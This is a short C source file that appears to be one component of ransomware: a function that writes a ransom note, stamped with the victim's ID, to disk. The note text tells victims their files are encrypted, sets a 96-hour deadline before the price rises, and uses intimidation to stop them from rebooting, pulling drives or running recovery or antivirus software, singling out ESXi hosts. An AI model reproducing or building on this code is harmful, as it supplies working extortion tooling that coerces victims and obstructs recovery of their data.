#include "note.h"

void createRansomNote(const char* filePath,const char *victimID)
{
    char note[4096];

    snprintf(note, sizeof(note), "So what happened?\n\n"
                                 "All files are encrypted with Integrated Encryption Scheme.\n"
                                 "The file structure was not damaged. You have been assigned a unique identifier.\n"
                                 "After the expiration of 96 hours, decryption cost will be automatically increased.\n"
                                 "Now you should send us message with your personal ID, which is at the bottom of the message.\n"
                                 "We hope that you understand the importance of the work we have done.\n"

                                 "Before paying you can send us 2 files for free decryption.\n"
                                 "The total size of files must be less than 2Mb.\n"
                                 "After infection, you have 96 hours to declare decryption.\n"
                                 "Files should not contain valuable information (databases, backups, large excel sheets, etc..).\n"

                                 "Attention! If you want to RECOVER YOUR DATA without problems - NEVER!!! :\n"
                                 "reboot, disconnect hard drives or take any action unless you know WHAT YOU ARE DOING!!!\n"
                                 "Otherwise, we cannot be 100%% sure that the decryptor will work correctly.\n"
                                 "!!!THIS IS ESPECIALLY RELATED TO ESXI!!!\n"

                                 "If you will try to use any third party software for restoring your data or antivirus solutions:\n"
                                 "this can lead to complete damage to all files and their irrecoverable loss.\n"
                                 "Any changes in encrypted files may entail damage of the private key and the loss of all data.\n"

                                 "Your personal id : %s\n"
                                 "We hope you carefully read this message and already know what to do.\n",
             victimID);

    FILE *file = fopen(filePath, "w");
    if (file)
    {
        fprintf(file, "%s", note);
        fclose(file);
    }
}